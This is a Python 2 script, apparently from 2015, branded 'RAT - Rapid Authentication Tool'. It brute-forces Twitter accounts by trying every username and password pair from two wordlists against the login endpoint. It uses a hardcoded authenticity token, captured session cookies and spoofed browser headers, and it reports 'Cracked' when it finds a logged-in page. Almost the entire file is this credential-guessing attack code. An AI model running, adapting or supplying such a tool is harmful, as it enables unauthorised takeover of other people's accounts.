
# Authenticate Query Unification Application
# Wayne Kenney - 2015                                   
#  _____                 ___     ___ 
# |  _  |___ _ _ ___ ___|_  |   |   |
# |     | . | | | .'|___|_| |_ _| | |
# |__|__|_  |___|__,|   |_____|_|___|
#         |_|                        
# By Pythogen

# RAT - Rapid Authentication Tool 1.0 

# Frame.py:

# Modules
import requests
from random import randint
import time

# Program Information
print '\nPyAqua-1.0 - Requests Module Prototype\nBy Pythogen'

# Main Routine.
def main():

	# Enable access to variables ANYWHERE
	global USERNAME
	global PASSWORD
	global login_URL
	global page
	global landing
	global keyword
	global attempts
	import time
	global uname
	global pwd

	# Site's Name (Banner)
	Service = 'RAT - Rapid Authentication Tool [Twitter]'
	# Login URL
	login_URL = 'https://twitter.com/sessions'
	# login_URL redirected to after login_URL containing keyword
	landing = 'https://twitter.com/'
	# The keyword that indicates successful login_URL detection
	keyword = 'logged-in'


	print ' ______     ______     ______ '
	print '/\  == \   /\  __ \   /\__  _\ '
	print '\ \  __<   \ \  __ \  \/_/\ \/'
	print ' \ \_\ \_\  \ \_\ \_\    \ \_\ '
	print '  \/_/ /_/   \/_/\/_/     \/_/'
	
	# Display Banner
	print '\n%s\n' % (Service)

	print '       __             _,-"~^"-.'
	print '     _// )      _,-"~`         `.'
	print '    ." ( /`"-,-"`                 ;'
	print '   / 6                             ;'
	print '  /           ,             ,-"     ;'
	print ' (,__.--.      \           /        ;'
	print ' //    /`-.\   |          |        `._________'
	print '   _.- _/`  )  )--...,,,___\     \-----------,)'
	print ' ((("~` _.- .-            __`-.   )         //'
	print '       ((("`             (((---~"`         //'
	print '                                          ((________________'


# Console prompt after successful login
def cpPrompt():

	# Command line Construct. Add commands here..
	while(True):

		# Listen for command input
		cmd = raw_input('%s>' % ('Command'))

		# Command Construct
		if cmd == '?':
			# Show list of commands
			print ('\nCommand List:'
				'\ngo - Start tool\n')
		elif cmd == 'go':
			# Activate
			processReq()
		elif cmd == 'quit':
			quit()
			
	
# Used for finding values between tags
def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""


def processReq():
	# Shorten method

	# For usernames
	text_file = open("list.txt", "r")
	text_pw = open("pw.txt", "r")


	with requests.Session() as c:
	
		# Username List 
		USERNAME = text_file.read().split('\n')
		# Password List
		PASSWORD = text_pw.read().split('\n')

		# Username cycle
		for u in USERNAME:
			# Password cycle
			for p in PASSWORD:
				# Print process
				uname = u
				pwd = p
				print '%s:%s' % (u,p)


				# 1) Direct to login url. Prepare for POST login
				c.get(login_URL)

				# POST Login data
				login_data = \
				{
					'js_inst': '1',
					'ui_metrics':'{"tt":11466,"v":2,"gts":1450137100482,"h":"f2340d5c","b":"500e5d425a57585c40160f6d154f505e5e4a54505a23252f22202436332d3b642f20216c63723c3a3932373b333f3a3c313e3f2e3e050e080c020a0e080d0f0d020905040e19535e5104100611141809130c111f06e5f3ace7e8e9a4abaae0e4ffe9ffe0eefcbcfcf2f7f9bbe7f4ecfdf2f2bfb2bdc9cfd6c6d6cbc7cb85d9cecd81dbc7cac7d4c091e99994c6cdd0c8d0cf93cadab8b5e0f9b0b7b3a2e4ebbbbea5bfa5bcfea3b7bebba3b3f5e2ada8aeb9f1fcae9588908897cb948285869c8ea2828a8ad2cb9492988693dbda8a9989999890d1636e6e6c764163777c6128313e39222d63726076717b387f7d707d73683f242816190e01574654424d47045c45495a47120b030002031a1556584c525b5c4a50326f2e222a2233262f2c68716e2820620502707f763b3721313e3b2f332f702f0c0016050b170b45524b3d02025e5c4d5c531c12021c11160c1608550c0f111bf5e2f6a1bea7c1e2ebe2e5a9a0aff9e6fef5fde4baf9f9f4f9f5c9eff3effff8c58398d7d6d0c38b8adec3c5c8c2d981c3d4c1c0dddad8e4ccd6c8dadbd89c85b4b3b7a6e8e7b1aea6ada5bce2a4a0abb5a9b7b79097f4edacabafbea1","hj":{"rf":{"a1b49f24729e664d05aa0cbfb446f8f534c4c3e8e230c47a809b2767b6e5ab01":14,"ddcc8a758b88fa6e0d7a2fb8915a9580d9b3704f45ba553b0c68d3d65ac49ae9":15,"a0b3a27ade2d5fe69acd2b22e68d179f3e842865c11866f6b4088258e370b3e3":-7,"fcade9323a644f02b9ac28da8616a10228846b46c7702ee1f531b3493d0fdc39":-20},"s":"tNIlf0yaLtsJlamAFpOcpqf0rbky5hiAeGiSa490iYwIkc_Wh65H_ua1BN-uEyWLxQqFE3Z0MZ_sUqyOZVWmw26tHs2nrU1-Vbt7IbE_ctIgp5oqTID984zqjyZsdkafdb7cKZ1X5NoGjYi4MYkrIeKaSl3QQmm-qXw5WMdJxUvxQNKZ18X3LYVztIigNzvFlBzQYzpis2G0MJxqaiLG_F4wnVCiTwB-zCgg3qHa4xDceXdDf_KdTMjzFd_bHGxqix9I0ZVcdYx6THI4EBWZ1zwYintTypgVR02atBmpT07ecHANeJCk0mAQJDooxiTBicUBggwm3CxodvCq9DvG6gAAAVGi6CLj"}}',
					'ui_metrics_seed': '1450135492530',
					'redirect_after_login': '/',
					'scribe_log': '',
					'return_to_ssl': 'true',
					'authenticity_token': 'af6061e29d9bc07f0f7efeed46e2a7e793cba14a',
					'session[password]': pwd,
					'session[username_or_email]': uname,
				}

				# Header data
				header_data = \
				{
					'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36',
					'upgrade-insecure-requests': '1',
					'referer': 'https://twitter.com/',
					'origin': 'https://twitter.com',
					'cookie': 'guest_id=v1%3A144332044792496653; kdt=HCIz41X0mWpFsHlk5CjbzccrmwNVDbP9CZBOiHDP; co=us; __utma=43838368.1512004912.1443341577.1445126553.1448206227.3; __utmz=43838368.1443343888.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); webn=4253103082; external_referer="Cmc0O2xAxZcZ+woBAlZ1v9TVfjk1HvlSD9bwwOa25Ww=|0"; remember_checked_on=0; dnt=1; _gat=1; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCB9Xy6JRAToMY3NyZl9p%250AZCIlYTE4YTBjOGVhZDlmZjE4MmUyMmJjYWFmZmE4NWI4NGQ6B2lkIiVmNjEz%250AMzY2ZTFlZmNlNmVjN2VkMTlkMGNhOTU5ODZiMg%253D%253D--0d9f216f46b78eac8430d286b6da808b6d308b67; ua="f5,m2,m5,rweb,msw"; _ga=GA1.2.1512004912.1443341577',
					'content-type': 'application/x-www-form-urlencoded',
					'content-length': '1953',
					'cache-control': 'max-age=0',
					'accept-language': 'en-US,en;q=0.8',
					'accept-encoding': 'gzip, deflate',
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
					'scheme': 'https',
					'path': '/sessions',
					'method': 'POST',
					'authority': 'twitter.com',
				}


				# 2) Submit POST data. Initialize login
				c.post(login_URL, data=login_data, headers=header_data)

				# 3) Landing page after login attempt. Function name as object. func.var = x
				processReq.page = c.get(landing)

				# 4) Looking for keyword indicating successful login
				Check = processReq.page.content.find(keyword)


				if Check == -1:
					print '\nLogin failed.'
					# print processReq.page.content
				else:
					print '\nLogin success!'
					x = raw_input("Cracked. Press enter to return.")
					# Login success. Go to command console
					cpPrompt()
					

# Go to main 
main()
cpPrompt()